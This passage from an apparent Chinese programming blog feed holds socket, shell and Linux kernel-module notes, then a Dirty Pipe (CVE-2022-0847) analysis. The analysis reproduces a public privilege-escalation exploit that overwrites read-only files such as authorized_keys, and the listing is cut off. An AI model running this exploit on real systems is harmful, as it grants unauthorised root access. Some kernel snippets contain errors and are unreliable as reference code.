argv);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">New_Socket</span><span class="hljs-params">(<span class="hljs-type">char</span>* addr, <span class="hljs-type">char</span>* port)</span> <span class="hljs-comment">//创建socket用于连接远程服务器</span><br>&#123;<br><span class="hljs-type">int</span> fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br>perror(<span class="hljs-string">&quot;socket&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">serveraddr</span>;</span><br>serveraddr.sin_family = AF_INET;<br>serveraddr.sin_port = htons(atoi(port));<br><span class="hljs-comment">//转换ip地址类型</span><br><span class="hljs-keyword">if</span> (inet_pton(AF_INET, addr, &amp;serveraddr.sin_addr) != <span class="hljs-number">1</span>) &#123;<br>perror(<span class="hljs-string">&quot;inet_pton&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-comment">//连接服务器</span><br><span class="hljs-keyword">if</span> (connect(fd, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;serveraddr, SOCKLEN) != <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;connect&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> fd;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span><br>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>) &#123;<br>Usage(argv[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//创建socket</span><br><span class="hljs-type">int</span> fd = New_Socket(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>]);<br><span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;connect server error!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//定义发送数据</span><br><span class="hljs-type">char</span>* str = <span class="hljs-string">&quot;Hello,World&quot;</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(str) + <span class="hljs-number">1</span>;<br><span class="hljs-comment">//将数据写入socket发送缓冲区</span><br><span class="hljs-keyword">if</span> (write(fd, str, len) != len) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;send string to server error!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;send string to server successful!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shell脚本编程</title>
    <link href="/2022/04/17/shell%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/"/>
    <url>/2022/04/17/shell%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="shell脚本编程"><a href="#shell脚本编程" class="headerlink" title="shell脚本编程"></a>shell脚本编程</h1><h2 id="1-第一个shell程序"><a href="#1-第一个shell程序" class="headerlink" title="1.第一个shell程序"></a>1.第一个shell程序</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello,world&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux设备驱动开发入门</title>
    <link href="/2022/04/17/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"/>
    <url>/2022/04/17/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="linux设备驱动开发入门"><a href="#linux设备驱动开发入门" class="headerlink" title="linux设备驱动开发入门"></a>linux设备驱动开发入门</h1><h3 id="1-linux内核模块开发入门"><a href="#1-linux内核模块开发入门" class="headerlink" title="1.linux内核模块开发入门"></a>1.linux内核模块开发入门</h3><p>基本步骤</p><pre><code class=" mermaid">graph LR;a(编写内核模块代码)--&gt;b(修改该目录下的Kconfig文件和Makefile)--&gt;c(运行内核模块)</code></pre><h6 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">__init 和__exit为两个宏</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// EXPORT_SYMBOL(gx);(声明符号表，使得该变量或者函数可以被其他模块调用)</span><br><span class="hljs-type">int</span> a = <span class="hljs-number">1</span>;<br><span class="hljs-type">char</span> *b = <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-type">int</span> c[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br>module_param(a,<span class="hljs-type">int</span>,<span class="hljs-number">0664</span>);<span class="hljs-comment">//内核模块传参,传参后内核函数可以直接使用这些参数</span><br>module_param(b,charp,<span class="hljs-number">0664</span>);<br>module_param(c,<span class="hljs-type">int</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0664</span>);<br><span class="hljs-type">int</span> __init <span class="hljs-title function_">my_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>    <span class="hljs-comment">//init函数必须为int类型</span><br>&#123;<br>    printk(<span class="hljs-string">&quot;just a test for linux kernel module test!\n&quot;</span>);<br>    printk(<span class="hljs-string">&quot;my init linux kernel module is running!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">void</span> __exit <span class="hljs-title function_">my_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//exit函数必须为void类型</span><br>    printk(<span class="hljs-string">&quot;just a test for linux kernel module test!\n&quot;</span>);<br><br>&#125;<br>module_init(my_init);<br><span class="hljs-comment">//当该内核模块插入时将会执行my_init函数</span><br>module_exit(my_exit);<br><span class="hljs-comment">//当该内核模块移除时将会执行my_exit函数</span><br>MODULE_LICENCE(<span class="hljs-string">&quot;GPL&quot;</span>);<span class="hljs-comment">//指定模块的开源协议</span><br>MODULE_AUTHOR(<span class="hljs-string">&quot;bugprogram-git&quot;</span>);<span class="hljs-comment">//指定模块的作者</span><br>MODULE_DESCRIPTION(<span class="hljs-string">&quot;just a kernel module test&quot;</span>);<span class="hljs-comment">//指定内核模块的详细信息</span><br>MODULE_ALIAS(<span class="hljs-string">&quot;mymodule&quot;</span>);<span class="hljs-comment">//指定模块的别名</span><br><span class="hljs-comment">//这些MODLE_*的本质其实是定义在static字符数组用于存放指定字符串内容，这些字符串内容链接时存放在.modinfo字段,可以用modinfo命令来查看这些模块信息,用法</span><br>modinfo $(MODULE_NAME)<span class="hljs-comment">//查看某个模块的信息</span><br></code></pre></td></tr></table></figure><h3 id="2-修改模块代码所在的目录的Kconfig文件"><a href="#2-修改模块代码所在的目录的Kconfig文件" class="headerlink" title="2.修改模块代码所在的目录的Kconfig文件"></a>2.修改模块代码所在的目录的Kconfig文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">config MY_MODULE<br>    tristate <span class="hljs-string">&quot;this is the linux kernel moule for test&quot;</span><br>    <span class="hljs-built_in">help</span><br>        just a <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><h3 id="3-修改该目录下的Makefile文件"><a href="#3-修改该目录下的Makefile文件" class="headerlink" title="3.修改该目录下的Makefile文件"></a>3.修改该目录下的Makefile文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">obj-$(CONFIG_MY_MODULE)         += module.o<br><span class="hljs-comment">#(这里的module.o要和.c文件的文件名一致,MY_MODULE要和Kconfig文件里面的指定一致)</span><br></code></pre></td></tr></table></figure><h3 id="4-运行内核模块"><a href="#4-运行内核模块" class="headerlink" title="4.运行内核模块"></a>4.运行内核模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">dmesg -C    <span class="hljs-comment">#清除内核已打印的信息</span><br>dmesg       <span class="hljs-comment">#查看内核打印信息</span><br>lsmod<span class="hljs-comment">#显示当前系统已经载入的模块</span><br>insmod<span class="hljs-comment">#将某个模块运行</span><br>dmesg<span class="hljs-comment">#查看内核打印信息</span><br></code></pre></td></tr></table></figure><h2 id="linux设备驱动开发"><a href="#linux设备驱动开发" class="headerlink" title="linux设备驱动开发"></a>linux设备驱动开发</h2><p>linux内核用设备号来区分不同的设备,设备号是一个32位的无符号整数,dev_t类型,而且设备号可以分为两个部分,</p><ul><li><p>1.主设备号</p><p>占12位</p></li><li><p>2.次设备号</p><p>占20位</p></li></ul><h4 id="常用的api"><a href="#常用的api" class="headerlink" title="常用的api"></a>常用的api</h4>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">MAJOR(<span class="hljs-type">dev_t</span> dev);<br><span class="hljs-comment">//获取设备号的主设备号</span><br>MINOR(<span class="hljs-type">dev_t</span> dev);<br><span class="hljs-comment">//获取设备的次设备号</span><br>MKDEV(<span class="hljs-type">int</span> major,<span class="hljs-type">int</span> minor);<br><span class="hljs-comment">//创建一个设备</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">register_chrdev_region</span><span class="hljs-params">(<span class="hljs-type">dev_t</span> from,<span class="hljs-type">unsigned</span> count,<span class="hljs-type">char</span> *name)</span>;<br><span class="hljs-comment">//手动注册一个设备到内核</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_chrdev_regionda</span><span class="hljs-params">(<span class="hljs-type">dev_t</span> *dev,<span class="hljs-type">unsigned</span> baseminor,<span class="hljs-type">unsigned</span> count,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">unregister_chrdev_region</span><span class="hljs-params">(<span class="hljs-type">dev_t</span> from,<span class="hljs-type">unsigned</span> count)</span>;<br><span class="hljs-comment">//注销一个设备</span><br><span class="hljs-comment">//动态注册一个设备到内核中</span><br><span class="hljs-comment">//分配成功后会在/proc/devices中查看到设备号对应的设备名称</span><br>cdev_alloc(<span class="hljs-type">void</span>);<br>cdev_init();<br>cdev_add();<br>cdev_del();<br><span class="hljs-comment">//将数据从内核空间拷贝到用户空间</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">copy_to_user</span><span class="hljs-params">(<span class="hljs-type">void</span> __user *to,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *from,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> n)</span><br></code></pre></td></tr></table></figure><h4 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h4>  <pre><code class=" mermaid">graph LR;a(申请设备号)--&gt;b(注册设备号)--&gt;c(设置设备对应的file_ops)--&gt;d(将其加入到内核的哈希链表中)</code></pre>]]></content>
    
    
    <categories>
      
      <category>嵌入式开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-0847漏洞原理及复现</title>
    <link href="/2022/04/17/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/04/17/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-0847漏洞原理及复现"><a href="#CVE-2022-0847漏洞原理及复现" class="headerlink" title="CVE-2022-0847漏洞原理及复现"></a>CVE-2022-0847漏洞原理及复现</h1><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>由于内核中copy_page_to_iter_pipe和push_pipe函数的正确初始化存在缺陷,可能存在旧值,攻击者可以利用此漏洞对任意只读文件缓存页进行覆盖,缓存会在系统内保留一段时间,在这段时间内系统的其他进程访问到的该文件内容都是攻击者修改过的文件缓存区的内容,从而将普通用户权限提升至root权限</p><h3 id="受影响的linux内核版本"><a href="#受影响的linux内核版本" class="headerlink" title="受影响的linux内核版本"></a>受影响的linux内核版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">5.8 &lt;= Linux Kernel &lt; 5.16.11 / 5.15.25 / 5.10.102<br></code></pre></td></tr></table></figure><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">pipe_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb,<span class="hljs-keyword">struct</span> iov_iter *from)</span><br>&#123;<br>    ....<br>    <span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<br>        <span class="hljs-comment">//如果缓存不为空则继续写</span><br>                 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>                 <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<br>                 <span class="hljs-type">int</span> offset = buf-&gt;offset + buf-&gt;len;<br><br>                <span class="hljs-comment">//这里判断有没有设置PIPE_BUF_FLAG_CAN_MERGE标志位,有该标志位则可以写(如果该位置空间不够则另开一块空间写)</span><br>                 <span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br>                     offset + chars &lt;= PAGE_SIZE) &#123;<br>                         ret = pipe_buf_confirm(pipe, buf);<br>                         <span class="hljs-keyword">if</span> (ret)<br>                                 <span class="hljs-keyword">goto</span> out;<br>                        <span class="hljs-comment">//写入内容</span><br>                         ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);<br>                         <span class="hljs-keyword">if</span> (unlikely(ret &lt; chars)) &#123;<br>                                 ret = -EFAULT;<br>                                 <span class="hljs-keyword">goto</span> out;<br>                         &#125;<br><br>                         buf-&gt;len += ret;<br>                         <span class="hljs-keyword">if</span> (!iov_iter_count(from))<br>                                 <span class="hljs-keyword">goto</span> out;<br>                 &#125;<br>         &#125;<br><br>         <span class="hljs-keyword">for</span> (;;) &#123;<br>                 <span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br>                         send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>                         <span class="hljs-keyword">if</span> (!ret)<br>                                 ret = -EPIPE;<br>                         <span class="hljs-keyword">break</span>;<br>                 &#125;<br><br>                 head = pipe-&gt;head;<br>&#125;<br></code></pre></td></tr></table></figure><p>在调用spice函数的时候会调用copy_page_to_iter_pipe函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">copy_page_to_iter_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> bytes,</span><br><span class="hljs-params">                          <span class="hljs-keyword">struct</span> iov_iter *i)</span><br>&#123;<br>         <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> i-&gt;pipe;<br>         <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span>;</span><br>         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_tail = pipe-&gt;tail;<br>         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head = i-&gt;head;<br>                          buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>         &#125;<br>         <span class="hljs-keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))<br>                 <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>         buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>         get_page(page);<br>         <span class="hljs-comment">//这里没有初始化标志位</span><br>         buf-&gt;page = page;<br>         buf-&gt;offset = offset;<br>         buf-&gt;len = bytes;<br><br>         pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<br>         i-&gt;iov_offset = offset + bytes;<br>         i-&gt;head = i_head;<br> out:<br>          i-&gt;count -= bytes;<br>         <span class="hljs-keyword">return</span> bytes;<br> &#125;<br></code></pre></td></tr></table></figure><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在调用函数spice的时候,系统会直接将缓存页替换成文件缓存页,并且没有初始化标志位,,由于spice函数在置换缓存页的时候没有对标志位进行初始化,所以该文件缓存页就会被误认为普通的缓存页，如果往管道里面写数据,就会把文件缓存页覆盖,缓存页会在系统内保存一段时间,导致后面访问的进程得到的该文件内容都是攻击者篡改的文件内容,以此可以通过覆盖关键文件达到提权的目的</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* SPDX-License-Identifier: GPL-2.0 */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Copyright 2022 CM4all GmbH / IONOS SE</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Proof-of-concept exploit for the Dirty Pipe</span><br><span class="hljs-comment"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span><br><span class="hljs-comment"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span><br><span class="hljs-comment"> * file contents in the page cache, even if the file is not permitted</span><br><span class="hljs-comment"> * to be written, immutable or on a read-only mount.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This exploit requires Linux 5.8 or later; the code path was made</span><br><span class="hljs-comment"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span><br><span class="hljs-comment"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span><br><span class="hljs-comment"> * there before, it just provided an easy way to exploit it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * There are two major limitations of this exploit: the offset cannot</span><br><span class="hljs-comment"> * be on a page boundary (it needs to write one byte before the offset</span><br><span class="hljs-comment"> * to add a reference to this page to the pipe), and the write cannot</span><br><span class="hljs-comment"> * cross a page boundary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Further explanation: https://dirtypipe.cm4all.com/</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> PAGE_SIZE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="hljs-comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">prepare_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> p[<span class="hljs-number">2</span>])</span><br>&#123;<br><span class="hljs-keyword">if</span> (pipe(p)) <span class="hljs-built_in">abort</span>();<br><br><span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> pipe_size = fcntl(p[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> buffer[<span class="hljs-number">4096</span>];<br><br><span class="hljs-comment">/* fill the pipe completely; each pipe_buffer will now have</span><br><span class="hljs-comment">   the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-type">unsigned</span> n = r &gt; <span class="hljs-keyword">sizeof</span>(buffer) ? <span class="hljs-keyword">sizeof</span>(buffer) : r;<br>write(p[<span class="hljs-number">1</span>], buffer, n);<br>r -= n;<br>&#125;<br><br><span class="hljs-comment">/* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="hljs-comment">   leaving the flags initialized) */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-type">unsigned</span> n = r &gt; <span 